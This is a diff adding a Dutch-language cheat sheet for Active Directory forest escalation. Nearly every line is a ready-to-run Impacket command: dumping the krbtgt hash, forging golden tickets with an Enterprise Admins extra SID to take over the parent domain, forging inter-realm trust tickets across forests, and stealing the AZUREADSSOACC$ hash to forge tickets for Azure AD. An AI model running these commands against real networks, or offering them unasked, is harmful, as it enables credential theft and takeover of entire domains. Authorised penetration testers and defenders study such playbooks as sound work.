@@ -1,0 +1,42 @@
+# Forest Pivot — Cross-forest aanvallen via SID History en trusts
+# Escaleer van één domein naar het hele forest of vertrouwde forests
+#
+# === Vereisten ===
+# - Domain Admin in het child domain (voor parent escalatie)
+# - Of trust key voor cross-forest aanvallen
+#
+# === Voorbeelden ===
+
+# === Child → Parent domein (ExtraSID attack) ===
+# Stap 1: krbtgt hash ophalen van child domain
+python3 secretsdump.py CHILD_DOMAIN/ADMIN:'PASS'@CHILD_DC -just-dc-user krbtgt
+
+# Stap 2: Enterprise Admins SID van parent opzoeken
+python3 lookupsid.py PARENT_DOMAIN/USER:'PASS'@PARENT_DC 0
+
+# Stap 3: Golden ticket met Enterprise Admins SID
+python3 ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid S-1-5-21-PARENT_SID-519 Administrator
+
+# Stap 4: Gebruik ticket voor parent domain
+export KRB5CCNAME=Administrator.ccache
+python3 psexec.py -k -no-pass CHILD_DOMAIN/Administrator@PARENT_DC_FQDN
+
+# raiseChild.py (automatisch)
+python3 raiseChild.py CHILD_DOMAIN/ADMIN:'PASS' -dc-ip CHILD_DC -target-exec PARENT_DC_FQDN
+
+# === Cross-forest via trust ticket ===
+# Stap 1: Trust key ophalen
+python3 secretsdump.py DOMAIN/ADMIN:'PASS'@DC -just-dc-user 'FOREIGN_DOMAIN$'
+
+# Stap 2: Inter-realm TGT forgen
+python3 ticketer.py -nthash TRUST_KEY -domain-sid LOCAL_SID -domain LOCAL_DOMAIN -extra-sid S-1-5-21-FOREIGN_SID-519 -spn krbtgt/FOREIGN_DOMAIN Administrator
+
+# === Seamless SSO token abuse (Azure AD) ===
+# AZUREADSSOACC$ account hash → forge Kerberos tickets voor cloud auth
+python3 secretsdump.py DOMAIN/ADMIN:'PASS'@DC -just-dc-user 'AZUREADSSOACC$'
+# Gebruik hash voor silver ticket naar Azure AD
+
+# Noot: SID Filtering blokkeert cross-forest SID History (maar niet binnen forest)
+# Noot: ExtraSID werkt altijd binnen een forest (parent-child trusts)
+# Noot: Cross-forest pivots zijn beperkter door SID Filtering
+# Noot: AZUREADSSOACC$ = brug tussen on-prem AD en Azure AD
